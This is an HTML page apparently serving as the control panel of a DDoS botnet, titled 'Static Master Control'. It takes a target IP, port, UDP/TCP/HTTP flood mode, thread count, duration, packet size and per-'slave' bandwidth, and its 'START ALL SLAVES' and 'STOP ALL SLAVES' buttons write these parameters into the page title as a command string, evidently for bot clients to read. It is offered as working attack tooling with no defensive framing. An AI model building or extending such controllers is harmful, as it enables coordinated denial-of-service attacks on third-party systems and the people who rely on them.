<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>STOP|0|0|stop|0|0|0|0</title>
  <style>
    body { font-family: Arial; background: #111; color: #0f0; text-align: center; padding: 30px; }
    input, select, button { padding: 12px; margin: 8px; font-size: 16px; }
    button { font-weight: bold; }
    .start { background: lime; color: black; }
    .stop  { background: red; color: white; }
  </style>
</head>
<body>
  <h1>Static Master Control</h1>

  <input id="ip" placeholder="Target IP" value="127.0.0.1"><br>
  <input id="port" placeholder="Port" value="53" type="number"><br>
  <select id="mode">
    <option value="udp">UDP</option>
    <option value="tcp">TCP</option>
    <option value="http">HTTP</option>
  </select><br>
  <input id="threads" placeholder="Threads" value="25" type="number"><br>
  <input id="duration" placeholder="Duration (sec)" value="25" type="number"><br>
  <input id="psize" placeholder="Packet Size" value="1024" type="number"><br>
  <input id="mbps" placeholder="Mbps per slave" value="4" type="number"><br><br>

  <button class="start" onclick="sendStart()">🚀 START ALL SLAVES</button>
  <button class="stop" onclick="sendStop()">⛔ STOP ALL SLAVES</button>

  <script>
    function updateTitle(action, ip, port, mode, threads, duration, psize, mbps) {
      const title = `${action}|${ip}|${port}|${mode}|${threads}|${duration}|${psize}|${mbps}`;
      document.title = title;
      console.log("New Title Set:", title);
    }

    function sendStart() {
      const ip = document.getElementById('ip').value;
      const port = document.getElementById('port').value;
      const mode = document.getElementById('mode').value;
      const threads = document.getElementById('threads').value;
      const duration = document.getElementById('duration').value;
      const psize = document.getElementById('psize').value;
      const mbps = document.getElementById('mbps').value;

      updateTitle("START", ip, port, mode, threads, duration, psize, mbps);
      alert("START command sent via page title!");
    }

    function sendStop() {
      updateTitle("STOP", "0", "0", "stop", "0", "0", "0", "0");
      alert("STOP command sent!");
    }
  </script>
</body>
</html>
